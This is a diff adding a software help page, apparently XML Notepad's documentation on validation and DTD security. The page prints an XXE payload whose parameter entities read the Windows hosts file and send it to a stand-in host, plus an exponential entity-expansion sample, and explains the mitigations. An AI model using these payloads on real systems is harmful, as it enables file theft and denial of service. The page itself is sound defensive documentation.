@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    
+    <link rel="canonical" href="https://microsoft.github.io/XmlNotepad/help/validation/">
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Validation - XmlNotepad</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <link href="../../css/main.css" rel="stylesheet">
+    <link href="../../css/syntax.css" rel="stylesheet">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Validation", url: "#_top", children: [
+          ]},
+          {title: "DTD Entity Leakage", url: "#dtd-entity-leakage", children: [
+              {title: "Impact", url: "#impact" },
+              {title: "Mitigation", url: "#mitigation" },
+              {title: "Entity explosion", url: "#entity-explosion" },
+              {title: "Mitigation", url: "#mitigation_1" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="https://www.googletagmanager.com/gtag/js?id=UA-89203408-1"></script>
+      <script src="https://consentdeliveryfd.azurefd.net/mscc/lib/v2/wcp-consent.js"></script>
+      <script src="../../assets/js/cookies.js"></script>
+      <script src="../../assets/js/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+<div id="cookie-banner"></div>
+
+
+<div class="wrapper wm-page-content">
+  <div class="container-fluid">
+    <a name="_top"></a>
+      
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../xslt/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../xslt/" class="btn btn-xs btn-link">
+        Xslt
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../dynamic/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../dynamic/" class="btn btn-xs btn-link">
+        Dynamic Help
+      </a>
+    </div>
+    
+  </div>
+
+      
+
+      <h2 id="validation">Validation<a class="headerlink" href="#validation" title="Permanent link">#</a></h2>
+<p>XML Notepad validates your document while you are editing and shows any errors or warnings in the Error List panel. You
+can double click those errors to navigate to the node in error so you can then fix it.</p>
+<p>XSD Schemas are located using the standard <code>xsi:schemaLocation</code> and <code>xsi:noNamespaceSchemaLocation</code> attributes where the <code>xsi</code>
+prefix is bound to the <code>http://www.w3.org/2001/XMLSchema-instance</code> namespace or you can specify schemas using the <a href="../schemas/">Schema
+Dialog</a>.</p>
+<p>Once a schema is associated with your document you will also get prompted by <a href="../intellisense/">Intellisense</a> for element
+and attribute names and values.</p>
+<h2 id="dtd-entity-leakage">DTD Entity Leakage<a class="headerlink" href="#dtd-entity-leakage" title="Permanent link">#</a></h2>
+<p>Users must be careful about which DTD's they allow XML Notepad to process.  There is a well known attack using malicious DTD's that works like this:</p>
+<p><strong>Step 1</strong> - Create <code>bait.xml</code>:</p>
+<pre><code class="language-xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;!DOCTYPE root SYSTEM &quot;http://untrusted/MaliciousDtd.dtd&quot; [
+&lt;!ELEMENT root (#PCDATA)&gt;
+]&gt;
+</code></pre>
+<p><strong>Step 2</strong> - User open <code>bait.xml</code> in XML Notepad, unaware that is a malicious XML file.</p>
+<p><strong>Result:</strong> XML Notepad immediately makes an outbound HTTP GET request to the listener</p>
+<p><strong>The malicious DTD contains parameter entities that read local secrets</strong>
+and then sends those secrets to someplace as URL query parameters:</p>
+<pre><code class="language-xml">&lt;!ENTITY % hosts SYSTEM &quot;file:///C:/Windows/System32/drivers/etc/hosts&quot;&gt;
+&lt;!ENTITY % leak SYSTEM &quot;http://someplace/bad.dtd&amp;amp;hosts=%hosts;&quot;&gt;
+&lt;!ENTITY bad &quot;&lt;![CDATA[%leak;]]&gt;&quot;&gt;
+</code></pre>
+<p>A safe example of this is included in the XML Notepad samples folder named <code>DtdEntityLeakage.xml</code>.</p>
+<h3 id="impact">Impact<a class="headerlink" href="#impact" title="Permanent link">#</a></h3>
+<p>Any user who opens a specially crafted XML file in XML Notepad is vulnerable — no clicks beyond opening the file are required. An attacker can use this capture secrets from your
+local machine.</p>
+<h3 id="mitigation">Mitigation<a class="headerlink" href="#mitigation" title="Permanent link">#</a></h3>
+<p>This is why XML Notepad disables DTD processing by default.  If you have DTD's that you
+know and trust, then you can safely enable DTD processing using the View/Options dialog
+and set <code>Ignore DTD=False</code> under Validation options.</p>
+<h3 id="entity-explosion">Entity explosion<a class="headerlink" href="#entity-explosion" title="Permanent link">#</a></h3>
+<p>A malicious DTD can also contain entities that explode into gigabytes of memory by writing
+something like this:</p>
+<pre><code class="language-xml">&lt;!ENTITY e0 &quot;This is some long text that we will replicate exponentially&quot;&gt;
+&lt;!ENTITY e1 &quot;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&amp;e0;&quot;&gt;
+&lt;!ENTITY e2 &quot;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&amp;e1;&quot;&gt;
+&lt;!ENTITY e3 &quot;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&amp;e2;&quot;&gt;
+&lt;!ENTITY e4 &quot;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&amp;e3;&quot;&gt;
+</code></pre>
+<p>Such a DTD could cause out of memory problems and likely cause the termination of XML Notepad.
+This is demonstrated in the XML Notepad samples <code>DtdEntityExplosion.xml</code></p>
+<h3 id="mitigation_1">Mitigation<a class="headerlink" href="#mitigation_1" title="Permanent link">#</a></h3>
+<p>Don't use DTD's in XML Notepad that you do not trust, or set "Ignore DTD" to true in the View/Options dialog.</p>
+
+    <br>
+      
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../xslt/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../xslt/" class="btn btn-xs btn-link">
+        Xslt
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../dynamic/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../dynamic/" class="btn btn-xs btn-link">
+        Dynamic Help
+      </a>
+    </div>
+    
+  </div>
+
+      <br>
+  </div>
+</div>
+
+<footer class="wm-page-content">
+
+  
+<div class='footer-content'>
+  <div class="container-fluid">
+    <div class="col-sm-8 text-left footnote-copy">
+       XML Notepad
+    </div>
+    <div class="col-sm-4 text-right footnote-copy">
+      <ul class="list-unstyled list-inline">
+        <li><a href="https://www.microsoft.com/" target="_blank"><img class="img-responsive" width="140" src="http://microsoft.github.io/XmlNotepad/assets/images/microsoft.svg" alt="Microsoft"> </a></li>
+      </ul>
+    </div>
+  </div>
+  <li><span id="copyright"></span></li>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by noraj.</p>
+</div>
+
+</footer>
+
+
+<script type="text/javascript">
+    $(document).ready(function () {
+      $('table').each(function () {
+        $(this).addClass("table");
+        $(this).addClass("table-bordered");
+        $(this).addClass("table-striped");
+        $(this).addClass("table-condensed");
+      });
+
+    });
+</script>
+
+</body>
+</html>
